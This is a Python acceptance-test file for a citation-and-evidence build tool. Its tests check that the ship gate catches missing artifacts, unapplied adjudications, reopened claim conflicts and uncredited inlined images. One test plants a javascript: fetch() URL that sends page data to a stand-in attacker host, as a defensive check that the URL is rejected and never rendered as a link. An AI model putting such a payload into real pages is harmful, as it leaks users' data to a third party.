"""AT-21: the gates that matter most must be reachable, not merely correct.

Every case here is a path where the ship gate used to go quiet: an artifact that is not there,
a link scheme nobody checked, an adjudication with no mechanical effect, a cluster that grew
after it was settled, an image the licensing apparatus never saw.
"""

import json
import sys as _sys

from _common import *  # noqa: F403

_sys.path.insert(0, str(ROOT / "scripts"))

TOPIC = "fixture.cards.active"

# A 1x1 transparent PNG. The bytes are irrelevant; the point is that it is inlined.
PIXEL = ("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR4"
         "nGNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=")
FIG = ('<figure><img src="{src}" alt="A one-pixel placeholder">'
       '<figcaption>{caption}</figcaption></figure>')


def _conflicting(d):
    """Two numeric claims on one topic_key, from sources at different distances."""
    ids = source_ids(d)
    op, tw = ids["operator-status.md"], ids["trade-report.md"]
    q1 = "There are 1.4 million active Meridian Cards in circulation as of 12 February 2026."
    s1, e1 = span(d, op, q1)
    a = add_claim(d, {
        "text": "Northline reports 1.4 million active Meridian Cards.",
        "topic_key": TOPIC, "kind": "number", "confidence": "verified",
        "evidence": [{"source_id": op, "start": s1, "end": e1, "quote": q1}]})
    q2 = "An earlier industry estimate put the number of active Meridian Cards at 1.9 million."
    s2, e2 = span(d, tw, q2)
    b = add_claim(d, {
        "text": "An industry estimate put active Meridian Cards at 1.9 million.",
        "topic_key": TOPIC, "kind": "number", "confidence": "reported",
        "evidence": [{"source_id": tw, "start": s2, "end": e2, "quote": q2}]})
    return a, b


def _record_both_stand(d, a, b, apply: bool):
    from sourcebook.ids import cluster_id

    (d / "adj.json").write_text(json.dumps({"adjudications": [{
        "cluster_id": cluster_id(TOPIC), "topic_key": TOPIC, "claim_ids": [a, b],
        "outcome": "both_stand", "winner": None,
        "reason": "Two figures for the same population from sources at different distances "
                  "from the fact, and a reader needs to see both to judge either.",
        "decided_at": "2026-07-26T10:00:00Z"}]}), encoding="utf-8")
    args = ["adjudicate", "--file", "adj.json"] + (["--apply"] if apply else [])
    rc, out = sb(d, *args)
    assert rc == 0, out


def test_a_absent_artifact_fails_the_gate():
    """AT-21a: a missing artifact is a finding, not three silently skipped gates."""
    with tempdir() as d:
        full_build(d)
        rc, out = sb(d, "verify")
        assert rc == 0 and "PASS" in out, out

        (d / "build" / "answer.html").unlink()
        rc, out = sb(d, "verify")
        assert rc == 2, f"an absent artifact passed the ship gate:\n{out}"
        assert "E-HTML-MISSING" in out, out

        # The claim-to-DOM, licence, and lint gates must not simply vanish from the report.
        assert "html" in out and "licenses" in out, out

        # Failing because nothing is built yet is not a failed revision: checking early must
        # not walk the workspace toward BLOCKED.
        for _ in range(3):
            rc, out = sb(d, "verify")
            assert rc == 2 and "E-HTML-MISSING" in out, out
        m = json.loads((d / "sourcebook.json").read_text(encoding="utf-8"))
        assert m["revise_count"] == 0, m["revise_count"]
        rc, out = sb(d, "status")
        assert rc == 0 and "BLOCKED" not in out, out


def test_b_recheck_url_must_be_http():
    """AT-21b: a `javascript:` recheck fails the gate and never becomes an href."""
    with tempdir() as d:
        bootstrap(d)
        op = source_ids(d)["operator-status.md"]
        q = "No other scheme is live at this time."
        s, e = span(d, op, q)
        cid = add_claim(d, {
            "text": "Only two partner schemes are live on Northline services.",
            "topic_key": "fixture.live", "kind": "fact", "confidence": "verified",
            "volatile": True, "as_of": "2026-02-12",
            "recheck": "javascript:fetch('https://evil.example/?'+document.title)",
            "evidence": [{"source_id": op, "start": s, "end": e, "quote": q}]})

        rc, out = sb(d, "verify")
        assert rc == 2, out
        assert "E-RECHECK-SCHEME" in out and cid in out, out

        rc, rendered = sb(d, "ledger", "--html")
        assert rc == 0, rendered
        assert "javascript:" not in rendered.replace("&#x27;", "'").split("withheld")[0], rendered
        assert 'href="javascript:' not in rendered, rendered
        assert "recheck URL withheld" in rendered, rendered

        rc, rendered_md = sb(d, "ledger", "--md")
        assert rc == 0 and "[recheck](javascript:" not in rendered_md, rendered_md


def test_c_adjudication_without_apply_fails():
    """AT-21c: a recorded outcome that never reached the claims blocks the ship gate."""
    with tempdir() as d:
        bootstrap(d)
        a, b = _conflicting(d)
        _record_both_stand(d, a, b, apply=False)

        # Nothing became contested, so E-CONTESTED-HIDDEN has nothing to fire on...
        assert all(c["confidence"] != "contested" for c in claims(d)), claims(d)
        order = ordered_claims(d)
        compose(d, [order[0]])          # an artifact that quietly picks one side
        render_and_inject(d)
        rc, out = sb(d, "verify", "--html", "build/answer.html")
        assert rc == 2, f"a one-sided artifact passed under an unapplied both_stand:\n{out}"
        assert "E-ADJ-UNAPPLIED" in out, out

        # ...and once applied, the original obligation is what blocks.
        rc, out = sb(d, "adjudicate", "--apply")
        assert rc == 0, out
        rc, out = sb(d, "verify", "--html", "build/answer.html")
        assert rc == 2 and "E-CONTESTED-HIDDEN" in out, out

        order = ordered_claims(d)
        compose(d, order)
        render_and_inject(d)
        rc, out = sb(d, "verify", "--html", "build/answer.html")
        assert rc == 0, out


def test_d_new_member_reopens_an_adjudicated_cluster():
    """AT-21d: a claim that joins the cluster after the verdict reopens it."""
    with tempdir() as d:
        bootstrap(d)
        a, b = _conflicting(d)
        _record_both_stand(d, a, b, apply=True)
        rc, out = sb(d, "verify")
        assert "E-CLUSTER-OPEN" not in out, out

        ff = source_ids(d)["forum-thread.md"]
        q = "Bring cash."
        s, e = span(d, ff, q)
        c = add_claim(d, {
            "text": "A traveller count put active Meridian Cards nearer 0.6 million.",
            "topic_key": TOPIC, "kind": "number", "confidence": "reported",
            "evidence": [{"source_id": ff, "start": s, "end": e, "quote": q}]})

        rc, out = sb(d, "contradictions")
        assert rc == 0 and "OPEN" in out and c in out, out
        rc, out = sb(d, "verify")
        assert rc == 2, f"a third conflicting claim inherited the old verdict:\n{out}"
        assert "E-CLUSTER-OPEN" in out and c in out, out


def test_e_data_uri_image_is_licensed_and_labelled():
    """AT-21e: an inlined image is credited and labelled like any other asset."""
    from sourcebook.licenses import data_uri_name

    with tempdir() as d:
        bootstrap(d)
        name = data_uri_name(PIXEL)
        path = d / "build" / "answer.html"
        path.parent.mkdir(parents=True, exist_ok=True)

        def artifact(caption):
            path.write_text(SHELL.format(body=FIG.format(src=PIXEL, caption=caption)),
                            encoding="utf-8")

        (d / "assets").mkdir(parents=True, exist_ok=True)

        def credits(payload):
            (d / "assets" / "credits.json").write_text(json.dumps(payload), encoding="utf-8")

        artifact("A placeholder")
        credits({})
        rc, out = sb(d, "licenses", "--html", "build/answer.html")
        assert rc == 2, f"an inlined image escaped the licensing gate:\n{out}"
        assert "E-IMG-UNCREDITED" in out and name in out, out

        credits({name: {"origin": "generated", "generator": "an image model",
                        "prompt": "a single transparent pixel",
                        "created_at": "2026-07-26T10:22:00Z"}})
        rc, out = sb(d, "licenses", "--html", "build/answer.html")
        assert rc == 2 and "E-IMG-UNLABELED" in out, out

        artifact("A placeholder. Generated illustration")
        rc, out = sb(d, "licenses", "--html", "build/answer.html")
        assert rc == 0, out

        # A denied licence is denied whether the bytes are inlined or on disk.
        credits({name: {"origin": "sourced", "source": "https://example.org/pixel.png",
                        "credit": "Someone / Somewhere", "license": "CC BY-NC 4.0"}})
        rc, out = sb(d, "licenses", "--html", "build/answer.html")
        assert rc == 2 and "E-IMG-LICENSE" in out, out


def test_f_data_asset_names_an_inlined_image():
    """AT-21f: `data-asset` gives an inlined image a legible credits key."""
    with tempdir() as d:
        bootstrap(d)
        (d / "assets").mkdir(parents=True, exist_ok=True)
        (d / "assets" / "credits.json").write_text(json.dumps({
            "settlement-flow.png": {
                "origin": "generated", "generator": "an image model",
                "prompt": "a plain two-column settlement flow diagram, no text",
                "created_at": "2026-07-26T10:22:00Z"}}), encoding="utf-8")
        body = (f'<figure><img src="{PIXEL}" data-asset="settlement-flow.png" '
                f'alt="A settlement flow"><figcaption>A flow. Generated illustration'
                f'</figcaption></figure>')
        path = d / "build" / "answer.html"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(SHELL.format(body=body), encoding="utf-8")
        rc, out = sb(d, "licenses", "--html", "build/answer.html")
        assert rc == 0, out
        assert "1 asset(s), 1 referenced" in out, out
